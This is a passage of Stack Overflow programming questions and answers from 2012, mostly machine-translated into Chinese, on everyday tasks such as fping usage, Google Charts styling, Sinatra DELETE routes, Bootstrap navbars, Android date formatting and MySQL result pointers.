如果您可以使用 OnTouchListener 和 OnLongClickListener 而不是按钮，那么实现起来会更容易一些。此外，如果您只想选择项目，使用标准的内置 Android 机制会更容易。

只有当你真的需要在每个列表项上都有一个按钮时，你才必须像 Gaurav Agarwal 建议的那样去做...... - 这是你迟早可能要做的事情:-)

# file - 批处理文件如何ping

> ID：10270801
> 
> 赞同：0
> 
> 时间：2012-04-22T18:26:45.683
> 
> 标签：file, batch-file

我如何 ping 192.168.1.1 10 次，每次 ping 后中断 3 厘秒！在命令提示符下。ping 命令真的很混乱。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T18:35:18.777

你应该得到`fping`并使用它：

```
fping -c 10 -p 30ms 192.168.1.1 
```

这将向 192.168.1.1 发送 10 个数据包，每个数据包之间的间隔为 30ms

`fping`因为它允许在需要时进行泛洪，所以在不等待回复的情况下发送之间的 30 毫秒间隔无论如何都被认为是泛洪...

`-t msecs`您可以为单个数据包添加超时，此超时是非阻塞的，因此数据包之间的间隔始终相同，在这种情况下为`-p 30`30 毫秒。

### fping 丢包

因此，`fping -p 30ms -t 10000 -s example.com`可能首先显示一些数据包丢失，但在打印摘要之前等待之后，它应该有足够的时间（10 秒）来接收在 30 毫秒帧内未收到的所有数据包，最终摘要显示根本没有真正的丢失。

### 数据包超出间隔但在超时内到达的示例：

命令：

```
fping -c 10 -p 30ms -s -t 10000 -e somehost.com 
```

输出：

```
somehost.com : [0], 84 bytes, 299 ms (299 avg, 90% loss)
somehost.com : [1], 84 bytes, 269 ms (284 avg, 80% loss)
somehost.com : [2], 84 bytes, 239 ms (269 avg, 70% loss)
somehost.com : [3], 84 bytes, 209 ms (254 avg, 60% loss)
somehost.com : [4], 84 bytes, 179 ms (239 avg, 50% loss)
somehost.com : [5], 84 bytes, 158 ms (225 avg, 40% loss)
somehost.com : [6], 84 bytes, 128 ms (212 avg, 30% loss)
somehost.com : [7], 84 bytes, 137 ms (202 avg, 20% loss)
somehost.com : [8], 84 bytes, 137 ms (195 avg, 10% loss)
somehost.com : [9], 84 bytes, 127 ms (188 avg, 0% loss)

somehost.com : xmt/rcv/%loss = 10/10/0%, min/avg/max = 127/188/299

       1 targets
       1 alive
       0 unreachable
       0 unknown addresses

       0 timeouts (waiting for response)
      10 ICMP Echos sent
      10 ICMP Echo Replies received
       0 other ICMP received

 127 ms (min round trip time)
 188 ms (avg round trip time)
 299 ms (max round trip time)
        0.410 sec (elapsed real time) 
```

正如你所看到的，最终完全没有损失`0 timeouts`并且`10 ICMP Echo Replies received`out of `10 ICMP Echos sent`.

在这里你可以找到[fping for linux](http://fping.org/)。

在这里[fping for windows](http://www.kwakkelflap.com/fping.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T18:33:54.750

假设您在 Windows 命令行中：

```
ping 192.168.1.1 -n 10 -w 10 
```

这是一个帮助页面：[链接](http://www.computerhope.com/pinghlp.htm)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T18:37:23.500

ping 192.168.1.1 /n 10 /w 30

# cakephp - CakePHP 和 jQuery 自动完成

> ID：10270802
> 
> 赞同：0
> 
> 时间：2012-04-22T18:26:52.077
> 
> 标签：cakephp

我正在使用 CakePHP。我在我的应用程序中需要的是自动建议。我使用以下代码来实现我的目标：

```
jQuery("#name").autocomplete( '<?php echo HTTP_PATH.'songs/sss'; ?>', {
    multiple: true,
    mustMatch: true,        
    matchContains: true,
    autoFill: false,
}); 
```

将我的请求发送到`SongsController`'`sss`函数...我的控制器函数是：

```
public function sss(){
    $this->layout = '';
    $condition = '';
    $condition = array('Poet.status'=>'3');
    $poet_name = $this->Poet->find('list', array('conditions' => $condition));
    return $poet_name;
} 
```

第一个问题是我在数组中返回我的结果。我将如何在建议列表中再次分离我的结果。

第二件事是，当我尝试使用 Firebug 面板检查响应时，我注意到 CakePHP 正在等待此时的视图。我不想要任何观点，因为我没有更新任何东西......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-02-15T00:26:23.610

您需要检查将数据序列化为 JSON：[http ://book.cakephp.org/2.0/en/views/json-and-xml-views.html#using-data-views-with-the-serialize -键](http://book.cakephp.org/2.0/en/views/json-and-xml-views.html#using-data-views-with-the-serialize-key)。通过在视图中设置一个`_serialize`变量，您可以告诉 Cake 在收到数据视图请求时哪些数据是重要的。

您还需要在 jQuery 调用中的 URI 末尾添加`Router::parseExtensions('json');`和 a `.json`，以便 Cake 知道响应 JSON 数据视图并使用`_serialize`您设置的键中的数据，就像我上面提到的那样。这里有更多关于文件扩展名的信息：http: [//book.cakephp.org/2.0/en/development/routing.html#file-extensions](http://book.cakephp.org/2.0/en/development/routing.html#file-extensions)

这是我编写方法的方式：

```
public function sss(){
    $this->layout = '';
    $condition = array('Poet.status'=>'3');
    $poets = $this->Poet->find('list', array('conditions' => $condition));
    $this->set(compact('poets'));
    $this->set('_serialize', $poets);
} 
```

# javascript - 谷歌面积图轴和设置全宽

> ID：10270810
> 
> 赞同：22
> 
> 时间：2012-04-22T18:27:40.667
> 
> 标签：javascript, charts

我正在尝试设计样式并将另一个 2 x'axis 添加到 Google 面积图（图像中的 a 和 b）。例如，**a**轴应设置为 900 和**b** : 700。

还试图将图表扩展到包含 div 的全宽（960px），但我的解决方案似乎什么也没做。

![这是想要的效果](../Images/05c1f7b8565a2d325a1c854bc6ed4098.png) *这是想要的效果。*

**当前的js**

```
google.load("visualization", "1", {packages:["corechart"]});
  google.setOnLoadCallback(drawChart);
  function drawChart() {
    var data = google.visualization.arrayToDataTable([
      ['Year', 'Sales', 'Expenses'],
            ['November',  1000,      400],
            ['December',  1170,      460],
            ['January',  660,       1120],
            ['February',  690,       1120],
            ['March',  780,       1120],
            ['April',  820,       1120],
            ['May',  660,       1120],
            ['June',  1030,      540]
    ]);

    var options = {
      title: '',
      backgroundColor: 'none',
      width:'960',
      legend: {position: 'none'},
      hAxis: {title: 'Year',  titleTextStyle: {color: 'grey'},
      }
    };

    var chart = new google.visualization.AreaChart(document.getElementById('chart_div'));
    chart.draw(data, options);
  } 
```

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2012-04-24T20:07:35.380

要获得正确的图表宽度，请将`chartArea`定义添加到您的`options`对象。这些`chartArea`设置列在“配置选项”下的[`AreaChart`文档中：](https://developers.google.com/chart/interactive/docs/gallery/areachart)

```
chartArea: {
    left: 40,
    top: 10,
    width: 900,
    height: 350
} 
```

**演示：http:** [//jsfiddle.net/2H7sp/](http://jsfiddle.net/2H7sp/)

```
google.load("visualization", "1", { packages: ["corechart"] });
google.setOnLoadCallback(drawChart);

function drawChart() {
    var data = google.visualization.arrayToDataTable([
        ['Year', 'Sales', 'Expenses'],
        ['November', 1000, 400],
        ['December', 1170, 460],
        ['January', 660, 1120],
        ['February', 690, 1120],
        ['March', 780, 1120],
        ['April', 820, 1120],
        ['May', 660, 1120],
        ['June', 1030, 540]
    ]);

    var options = {
        title: '',
        backgroundColor: 'none',
        legend: { position: 'none' },
        hAxis: {
            title: 'Year',
            titleTextStyle: {
                color: 'grey'
            }
        },
        chartArea: {
            left: 40,
            top: 10,
            width: 600,
            height: 150
        }
    };

    var chart = new google.visualization.AreaChart(document.getElementById('chart_div'));
    chart.draw(data, options);
}
```

```
body { margin: 0; }
#chart_div {
    background-color: #f5f5f5;
    width: 660px;
    height: 200px;
    overflow: hidden;
    margin: 0 auto;
}
```

```
<script src="https://www.google.com/jsapi?jsapi.js"></script>
<div id="chart_div"></div>
```

你需要稍微玩一下这些数字。 `chartArea`指图表的图形部分，不包括轴、标题和图例。因此，您需要为您的值添加填充以留出空间。

**编辑：**要获得水平线，您需要为相应列中的每一行添加两个附加系列，其值为 900 和 700：

```
var data = google.visualization.arrayToDataTable([   
    [ 'Year',     'Sales',  'Expenses',  'a',   'b'  ],
    [ 'November',  1000,     400,         900,   700 ],   
    [ 'December',  1170,     460,         900,   700 ],   
    [ 'January',   660,      1120,        900,   700 ],
    ... 
```

`series`要获得正确的颜色，请为两个新系列设置不可见区域和黑色线条的选项指定定义。

```
var options = {
    ...
    series: {
        2: { areaOpacity: 0, color: "#000" },
        3: { areaOpacity: 0, color: "#000" }
    },
    ... 
```

这很接近，但线条将是实线而不是虚线，并且不会有标签。您可以通过向数据表中添加[具有角色的列](https://developers.google.com/chart/interactive/docs/roles)来获得这些效果。您将无法使用`.arrayToDataTable()`它，而是需要使用更详细的语法：

```
var data = new google.visualization.DataTable();
data.addColumn("string", "Year");
data.addColumn("number", "Sales");
data.addColumn("number", "Expenses");
data.addColumn("number", "a");
data.addColumn("number", "b");
data.addRows([
    ['November', 1000, 400,  900, 700],
    ['December', 1170, 460,  900, 700],
    ['January',  660,  1120, 900, 700],
    ... 
```

对于虚线，在每个“a”和“b”列之后添加一个[确定性角色](https://developers.google.com/chart/interactive/docs/roles#certaintyrole)列：

```
data.addColumn({ type: "boolean", role: "certainty" }); 
```

要获得“a”和“b”标签，请在每个确定性列之后添加[注释角色](https://developers.google.com/chart/interactive/docs/roles#annotationrole)列：

```
data.addColumn({ type: "string", role: "annotation" }); 
```

确定性列的值都应该是`false`。除了您希望标签出现的最后一行之外，注释列的值都应该为空。注释在数据点上方对齐，而不是在您想要的右侧对齐，但这已尽您所能。

添加了新列的数据行将如下所示：

```
data.addRows([
    ['November', 1000, 400,  900, false, null, 700, false, null],
    ['December', 1170, 460,  900, false, null, 700, false, null],
    ...
    ['May',      660,  1120, 900, false, null, 700, false, null],
    ['June',     1030, 540,  900, false, "a",  700, false, "b"]
]); 
```

而且，这是最终结果：http: **[//jsfiddle.net/2H7sp/2/](http://jsfiddle.net/2H7sp/2/)**

```
google.load("visualization", "1", { packages: ["corechart"] });
google.setOnLoadCallback(drawChart);

function drawChart() {
    var data = new google.visualization.DataTable();
    data.addColumn("string","Year");
    data.addColumn("number","Sales");
    data.addColumn("number","Expenses");
    data.addColumn("number","a");
    data.addColumn({type:"boolean",role:"certainty"});
    data.addColumn({type:"string",role:"annotation"});
    data.addColumn("number","b");
    data.addColumn({type:"boolean",role:"certainty"});
    data.addColumn({type:"string",role:"annotation"});
    data.addRows([
        ['November', 1000, 400,  900, false, null, 700, false, null],
        ['December', 1170, 460,  900, false, null, 700, false, null],
        ['January',  660,  1120, 900, false, null, 700, false, null],
        ['February', 690,  1120, 900, false, null, 700, false, null],
        ['March',    780,  1120, 900, false, null, 700, false, null],
        ['April',    820,  1120, 900, false, null, 700, false, null],
        ['May',      660,  1120, 900, false, null, 700, false, null],
        ['June',     1030, 540,  900, false, "a",  700, false, "b"]
    ]);

    var options = {
        title: '',
        backgroundColor: 'none',
        legend: { position: 'none' },
        hAxis: {
            title: 'Year',
            titleTextStyle: { color: 'grey' }
        },
        series:{
            2:{areaOpacity:0,color:"#000"},
            3:{areaOpacity:0,color:"#000"}
        },
        chartArea: {
            left: 40,
            top: 10,
            width: 600,
            height: 150
        }
    };

    var chart = new google.visualization.AreaChart(document.getElementById('chart_div'));
    chart.draw(data, options);
}
```

```
body { margin: 0; }
#chart_div {
    background-color: #f5f5f5;
    width: 660px;
    height: 200px;
    overflow: hidden;
    margin: 0 auto;
}
```

```
<script src="https://www.google.com/jsapi?jsapi.js"></script>
<div id="chart_div"></div>
```

# android - Writing in the file

> ID：10270811
> 
> 赞同：0
> 
> 时间：2012-04-22T18:27:44.130
> 
> 标签：android, file, user-input

I am making an app which creates a floder. In that folder it I am creating a file and writing Radha in it. but it shows Hello World, CreateActivity the code is

Create.java

```
public class CreateActivity extends Activity {
/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    //Context ctx = getApplicationContext(); 

    try { 
        File myDir = new File(getFilesDir().getAbsolutePath()); 
        String s = ""; 

        FileWriter fw = new FileWriter(myDir + "/Test.txt"); 
        fw.write("Radha"); 
        fw.close(); 

        BufferedReader br = new BufferedReader(new FileReader(myDir + "/Test.txt")); 
        s = br.readLine(); 

        // Set TextView text here using tv.setText(s); 

    } catch (FileNotFoundException e) { 
        e.printStackTrace(); 
    } catch (IOException e) { 
        e.printStackTrace(); 
    } 
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T18:33:12.517

您写入文件的内容与屏幕上的内容无关。检查布局 xml (res/layout/main.xml)。（当您调用 时，您正在使用它`setContentView(R.layout.main);`。）布局可能引用了可以在 res/values/strings.xml 中找到的字符串资源。更改该字符串以更改屏幕上显示的内容。

我建议您阅读适用于 Android 的[Hello World 教程](http://developer.android.com/resources/tutorials/hello-world.html)来了解这些基础知识。

# php - How to add an array into a comma delimited text file without deleting previous array values

> ID：10270814
> 
> 赞同：0
> 
> 时间：2012-04-22T18:27:48.210
> 
> 标签：php, arrays

I'm trying to make a form where the user can add their own 'questions + answers' to the quiz.

I loaded the original questions from a text file. The added questions will then be processed by **process_editadd.php**

```
<?php
session_start();
$file = fopen('data.txt', 'r');
$array=$_SESSION['questions_array'];

//make array out of values
$q=array($_POST['question'],$_POST['one'],$_POST['two'],$_POST['three'],$_POST['four']);
//add to file
$file=fopen("data.txt","w+");
fwrite($file, implode(',', $q)).

header('Location:module.php');

?> 
```

The array adds onto the text file, but the problem is that it *replaces* the whole thing. I don't want the questions to replace the previous ones, I just want them added. Do you guys know what's wrong with the code?

**Note:** I'm not allowed using mySQL or Javascript

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:32:12.767

您可以改用实际的数据库，让您的生活更轻松......如果做不到这一点，请查看[fputcsv](http://php.net/fputcsv)和[fgetcsv](http://php.net/fgetcsv)以使其成为一个稍微不那么乏味的问题。

您现在的内爆版本也容易受到 CSV 注入的影响……您无法处理您正在编写的任何文本可能包含逗号的情况。如果是这样，当您稍后读回数据时，您会突然发现您将拥有额外的“列”。

# jquery - JQuery 无限滚动和动态生成的页面

> ID：10270816
> 
> 赞同：1
> 
> 时间：2012-04-22T18:28:00.183
> 
> 标签：jquery

我正在尝试实现 Jquery Infinite Scroll ( [https://github.com/paulirish/infinite-scroll](https://github.com/paulirish/infinite-scroll) )。是否有一个选项可以使用此插件随每个滚动结束 ajax 请求发送的 GET 请求发送数据？我需要加载的数据是动态生成的，我需要知道最后加载的 Id。该插件似乎依赖于静态页面，如 2.html、3.html 等。请建议。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T22:03:31.443

尝试[https://github.com/renatosaito/jscroller](https://github.com/renatosaito/jscroller) 默认操作是 POST，但您可以轻松更改。

# jquery - 使用 jQuery 调用 Sinatra 删除路由

> ID：10270817
> 
> 赞同：3
> 
> 时间：2012-04-22T18:28:05.680
> 
> 标签：jquery, ruby, sinatra

我对 Sinatra 很陌生，正在制作一个简单的 todo 应用程序，它利用了基本的 CRUD 功能。

在后端，我有工作路线并测试了一切。我想合并一些前端功能，并决定使用 jQuery 来帮助解决这个问题。我在 jQuery 中有一段当前代码，当单击该项目时，它会将一个 css 类添加到其中一个待办事项中。我想包含一个按钮，上面写着“删除已完成的任务”，它将收集具有“已完成”类的任务，然后触发 Sinatra 路由，该路由将从数据库中删除任务。目前的西纳特拉路线是：

```
delete "/hub/note/:id" do
   n = Note.get params[:id]
   n.destroy
   redirect '/hub'
end 
```

如何让 jQuery 和 Sinatra 将删除项目与“已完成”类进行通信。任何帮助都会非常有用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T18:35:54.127

利用[method_override](http://www.sinatrarb.com/configuration.html#__enabledisable_the_post__hack)技巧/黑客，您可以通过执行以下操作获得您想要的：

```
jQuery.post("/hub/note/" + id, {_method: "delete"}, callback); 
```

任何利用[Rack](http://rack.rubyforge.org/doc/classes/Rack/MethodOverride.html)的东西，包括 Sinatra 和 Ruby on Rails，都应该有这种行为。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T03:43:45.817

在您的 jQuery 代码中。

```
$.post('/user/' + user.id, {_method: 'delete'}, function(result_data) {
  console.log('DELETE result', result_data);
}).error(function(){
  console.log("Error trying to DELETE");
}); 
```

在您的 Sinatra 代码中

```
delete "/user/:id" do
  if request.xhr?
    content_type :json
    id = params[:id].to_i
    user = User.find_by_id(id)
    if !user
      status 404
      return {:success => false, :message => "Invalid ID supplied."}.to_json
    end
    user.destroy
    return {:success => true, :id => id, :message => "The User with ID #{id} was deleted."}.to_json
  end
  status 403
  return "<html><head><title>Error 403</title></head><body><h2>Expected an AJAX call.</h2></body></html>"
end 
```

如果您的 sinatra 应用程序不是`modular`应用程序，那么还包括`set :method_override, true`与您的其他`set`s 的一行。

# css - Twitter Bootstrap 和移动导航栏

> ID：10270819
> 
> 赞同：4
> 
> 时间：2012-04-22T18:28:19.650
> 
> 标签：css, wordpress, twitter-bootstrap, responsive-design

我正在尝试在 Wordpress 上为我的博客制作响应式布局，但我无法克服移动设备上导航栏的问题。

```
<header class="span8" id="top-header">
<nav class="navbar navbar-fixed-top">
    <div class="navbar-inner">
        <div class="container-fluid">
            <a data-target=".nav-collapse" data-toggle="collapse" class="btn btn-navbar">
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </a>
            <?php 
            wp_nav_menu(array(
                'menu' => 'Top menu',
                'menu_class' => 'nav'
            ));
            ?>
            <ul class="nav">
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Categories <b class="caret"></b></a>
                    <ul class="dropdown-menu">
                    <?php 
                    $args = array(
                        'exclude'   =>'1',
                        'orderby'   =>'name',
                        'order'     => 'ASC'
                    );
                    foreach(get_categories($args) as $category): ?>
                        <li><a href="<?php echo get_category_link($category->term_id); ?>" title="Category: <?php echo $category->name; ?>"><?php echo $category->name; ?></a></li>
                    <?php endforeach; ?>
                    </ul>
                </li>
            </ul>
        </div>
    </div>
</nav>
<a href="<?php bloginfo('url'); ?>" title="<?php bloginfo('title'); ?> - Back to the homepage">
    <hgroup class="row-fluid">
        <?php if(is_single()):?>
            <h2 class="like-h1">My blog</h2>
        <?php else: ?>
            <h1>My blog</h1>
        <?php endif; ?>
        <h2>Bla bla bla</h2>
    </hgroup>
</a>
</header> 
```

在移动设备上，下拉菜单不像 Twitter Bootstrap 的示例那样工作，但它显示了导航栏中的每个链接。它不切换。你可以在这里看到它：[我的博客示例](http://betablog.piotrnalepa.pl/)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-22T18:37:54.037

您需要将菜单包装在`<div class="nav-collapse">..</div>`div 中，以便在屏幕调整大小/移动视图时折叠菜单。尝试这个：

**HTML**

```
<header class="span8" id="top-header">
<nav class="navbar navbar-fixed-top">
    <div class="navbar-inner">
        <div class="container-fluid">
            <a data-target=".nav-collapse" data-toggle="collapse" class="btn btn-navbar">
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </a>
            <div class="nav-collapse">
                <?php 
                wp_nav_menu(array(
                    'menu' => 'Top menu',
                    'menu_class' => 'nav'
                ));
                ?>
                <ul class="nav">
                    <li class="dropdown">
                        <a href="#" class="dropdown-toggle" data-toggle="dropdown">Categories <b class="caret"></b></a>
                        <ul class="dropdown-menu">
                        <?php 
                        $args = array(
                            'exclude'   =>'1',
                            'orderby'   =>'name',
                            'order'     => 'ASC'
                        );
                        foreach(get_categories($args) as $category): ?>
                            <li><a href="<?php echo get_category_link($category->term_id); ?>" title="Category: <?php echo $category->name; ?>"><?php echo $category->name; ?></a></li>
                        <?php endforeach; ?>
                        </ul>
                    </li>
                </ul>
            </div>
        </div>
    </div>
</nav>
<a href="<?php bloginfo('url'); ?>" title="<?php bloginfo('title'); ?> - Back to the homepage">
    <hgroup class="row-fluid">
        <?php if(is_single()):?>
            <h2 class="like-h1">My blog</h2>
        <?php else: ?>
            <h1>My blog</h1>
        <?php endif; ?>
        <h2>Bla bla bla</h2>
    </hgroup>
</a>
</header> 
```

另外，我建议您从页面中分离出您的固定导航`header`并将其隔离在`body`标签之后，这样当您调整屏幕大小时，围绕您的媒体查询或样式`header`不会影响顶部导航栏，不应固定在移动视图。

# ruby-on-rails - 了解 Rails 生成的 URL

> ID：10270823
> 
> 赞同：0
> 
> 时间：2012-04-22T18:29:12.687
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3.1

我是 Rails 的新手，我正在努力理解它。一件事让我对 rails 可以生成的 url 感到困惑。例如，如果我有一个在路由文件中标记为 :resource 的用户控制器。它生成各种 url，例如 user_path 或 edit_user_path。

我在哪里可以了解更多关于它正在生成的这些 url、它是如何做到的以及所有 url（即生成的）对我可用的信息。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T18:30:51.200

请参阅 Rails 指南： http: [//guides.rubyonrails.org/routing.html](http://guides.rubyonrails.org/routing.html)

这几乎解释了这一切。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-22T18:30:59.547

[“从外到内的 Rails 路由”指南](http://guides.rubyonrails.org/routing.html)是您的朋友；）

# javascript - 无需在 html 中添加任何 js 代码即可获取单击元素的 id

> ID：10270824
> 
> 赞同：7
> 
> 时间：2012-04-22T18:29:21.670
> 
> 标签：javascript, html, dom-events

我需要获取被点击的元素的 ID，但我需要将所有 js 和 html 分开。通常 id 只是在 html 中使用“this.id”。还有其他方法吗？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-04-22T19:13:30.353

这是`e.target`为了什么。你可以在任何你想要的地方添加一个事件监听器，只要允许点击事件冒泡到它（默认情况下发生）你就可以捕捉到它。一个基本的例子：

```
document.addEventListener('click', function(e) {
    alert(e.target.id);
}); 
```

单击每个将提醒其 ID。希望这可以帮助 ：）

```
<button id="foo">foo</button>
<button id="bar">bar</button>
<button id="baz">baz</button> 
```

**编辑**

[http://jsfiddle.net/95NZ8/](http://jsfiddle.net/95NZ8/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T19:03:13.790

尝试这样的事情：

```
$(document).ready(function () {
    $("#someWrapper").each(function () {
        $(this).on('click', function () {
            alert(this.id);
        });
    });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-07-04T10:24:46.550

```
window.onclick = e => {
    console.log(e.target.id);
} 
```

获取元素、标记名、类名、[其他属性](https://stackoverflow.com/a/44903739/2591092)

```
window.onclick = e => {
    console.log(e.target);
    console.log(e.target.tagName);
    console.log(e.target.className);
    console.log(e.target.id);
} 
```

# c# - 清除所有行后数据库没有变化

> ID：10270825
> 
> 赞同：0
> 
> 时间：2012-04-22T18:29:25.037
> 
> 标签：c#, database, datatable

我在尝试清除 C# 中的 DataTable 时遇到重大问题。

在数据库中编辑信息时的所有其他点，我使用过类似的东西

```
somethingTableTableAdapter1.Update(greenParksDataSet);  
greenParksDataSet1.AcceptChanges(); 
```

这工作得很好。但是，在我的一个表格中，我有一个按钮来清除打开的表格。它似乎清除了内存中的 DataTable，但实际上并未将更改传播到数据库。基本上代码归结为

```
greenParksDataSet.HistoryTable.RecieptIDColumn.AutoIncrementSeed = -1;
greenParksDataSet.HistoryTable.RecieptIDColumn.AutoIncrementSeed = -1;
greenParksDataSet.HistoryTable.RecieptIDColumn.AutoIncrementSeed = 1;
greenParksDataSet.HistoryTable.RecieptIDColumn.AutoIncrementSeed = 1;
greenParksDataSet.HistoryTable.Rows.Clear();

historyTableTableAdapter.Update(greenParksDataSet);
greenParksDataSet.AcceptChanges(); 
```

我试过搞乱事物的顺序，但似乎没有任何效果。单独使用该代码，DataTable 被清除（并且更改显示在 DataGridView 中），但是当在此`historyTableTableAdapter.Fill(greenParksDataSet.HistoryTable);`之后添加一个时，显示数据库没有被更改。

我可能错过了一些明显的东西，但多年来我一直对此感到困惑，任何帮助将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T18:33:07.340

看看[这个问题/答案](https://stackoverflow.com/questions/955427/delete-all-rows-in-a-datatable)。

Clear 仅适用于内存中的数据表 - 它不会将它们标记为删除。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T18:40:41.057

我认为您正在使用绑定源，因此请尝试以下操作：

```
greenParksDataSet.HistoryTable.Rows.Clear();
HistoryTableBindingSource.EndEdit();

historyTableTableAdapter.Update(greenParksDataSet);
greenParksDataSet.AcceptChanges(); 
```

# php - 如何重置 MySQL 资源的 PHP 指针？

> ID：10270831
> 
> 赞同：3
> 
> 时间：2012-04-22T18:30:16.183
> 
> 标签：php

> **可能重复：**
> [如何将 mysql 指针重置回 PHP 中的第一行？](https://stackoverflow.com/questions/3817997/how-to-reset-mysql-pointer-back-to-the-first-row-in-php)

我的 PHP 脚本中有 2 个 while 循环，用于处理来自数据库的数据列表。

```
$results = mysql_query("SELECT * FROM myTable");
while ($result = mysql_fetch_object($results))  {
    // do stuff
}

reset($results);
while ($result = mysql_fetch_object($results))  {
    // do some more stuff
} 
```

但是，reset() 函数不会在 MySQL 资源中重置我的指针。事实上，它会产生一个错误：

> “警告：reset() [function.reset]：传递的变量不是第 133 行 /home/cs179_team13/public_html/timeTests/results.php 中的数组或对象。”

为什么？如何重置 MySQL 资源的 PHP 指针？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-22T18:33:13.133

您可以使用该功能`mysql_data_seek`。

`bool mysql_data_seek ( resource $result , int $row_number )`

更多信息可以在[http://www.php.net/manual/en/function.mysql-data-seek.php](http://www.php.net/manual/en/function.mysql-data-seek.php)找到。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-22T18:56:54.287

传递与 0 一起返回的结果集

```
mysql_data_seek($resultset, 0) ;//reset result set 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-22T18:52:24.793

你不需要这么丑陋的方式。
给自己一个数组。

```
$data = sql_to_arr("SELECT * FROM myTable");
foreach ($data as $row)  {
    // do stuff
}
foreach ($data as $row)  {
    // do stuff
}
foreach ($data as $row)  {
    // do stuff
} 
```

这是处理数据的更方便的方式

# regex - Backbone.js 和正则表达式路由

> ID：10270840
> 
> 赞同：3
> 
> 时间：2012-04-22T18:30:34.010
> 
> 标签：regex, backbone.js, url-routing

是否可以为URL 可能是这样的地方注册路由`/pages/*url`但不能注册路由？`/pages/*url/edit/``foo/bar/and-so-on`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T23:47:42.923

[router.route 原生](http://backbonejs.org/#Router-route)支持使用正则表达式。

```
initialize: function(options) {

  // Matches /117-a/b/c/open, passing "117-a/b/c" to this.open
  this.route(/^(.*?)\/open$/, "open");

},

open: function(id) { ... } 
```

# django - 在 settings.py 中使用 Django 日志记录工具

> ID：10270841
> 
> 赞同：0
> 
> 时间：2012-04-22T18:30:41.943
> 
> 标签：django, logging, error-logging, django-settings

我在/块`settings.py`中包含很多导入，例如：`try``catch`

```
try:
    import gcframe
except ImportError:
    # log gcframe is not available
    pass 
```

等等

我想使用 Django 记录器来记录缺少哪些模块，但是[Django 文档](https://docs.djangoproject.com/en/1.4/topics/logging/)说：

> 加载设置**后**立即配置日志记录。由于加载设置是 Django 所做的第一件事，因此您可以确定记录器始终可以在您的项目代码中使用。

加载设置后，有没有办法在其中创建消息（日志记录）`settings.py`并触发这些消息的记录？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T19:31:46.293

stderr 上的输出被更高级别的系统捕获。

```
print >>sys.stderr, 'zOMG!' 
```

# android - 以字符串格式获取月份

> ID：10270843
> 
> 赞同：0
> 
> 时间：2012-04-22T18:30:44.840
> 
> 标签：android

我想以 2012 年 4 月 22 日的格式显示日期。我正在使用这段代码：

```
 SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy");

        sdf.applyPattern("dd MMM yyyy");
        Date x = new Date(time.year,time.month,time.monthday);
        System.out.println(sdf.format(x)); 
```

但我得到 o/p 为：3912 年 4 月 22 日。我想知道为什么它显示 3912 代替 2012。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:48:29.350

请阅读 Date 类的[api](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/Date.html)。它从 1900 年开始，因此在此构造函数中您必须提供日期 - 1900。但此构造函数已被弃用，因此我的建议是开始使用 Calendar 对象进行与日期相关的操作。Java.da

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T18:59:58.703

```
Calendar cal=Calendar.getInstance();
SimpleDateFormat sdf  = new SimpleDateFormat("dd MMM yyyy");
String dateresult = sdf.format(cal.getTime()); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-22T19:14:01.827

```
SimpleDateFormat dateformate = new SimpleDateFormat("dd-MMM-yyyy");
    Calendar currentDate = Calendar.getInstance();

    String currentDateStr = dateformate.format(currentDate.getTime());
    Log.i("Infoe ", " " + currentDateStr.toString());       
    System.out.println("Current date is :  " + currentDateStr);
    ////=== OR

    SimpleDateFormat sdf = new SimpleDateFormat("dd-MMM-yyyy");

    sdf.applyPattern("dd-MMM-yyyy");
    Date x = new Date(currentDate.get(Calendar.YEAR) - 1900,
            currentDate.get(Calendar.MONTH), currentDate.get(Calendar.DAY_OF_MONTH));
    Log.i("Infoe ", " " + sdf.format(x));
    System.out.println(sdf.format(x)); 
```

它的 3912 bcz .​​..日期设置为... Calendar.set(year + 1900, month, date) 或 GregorianCalendar(year + 1900, month, date)。根据公历

我认为日历的使用是 gd，因为不推荐使用日期...对于日期格式，请使用 dd-MMM-yyyy no dd-MM-yyyy bcz 您想要月份前 2 个字符... [对于日期格式](http://developer.android.com/reference/android/text/format/DateFormat.html)

# android - 为什么我在运行我的应用程序一段时间后得到 ConcurrentModificationException？

> ID：10270845
> 
> 赞同：2
> 
> 时间：2012-04-22T18:30:53.117
> 
> 标签：android, runtime-error, runnable, achartengine, concurrentmodification

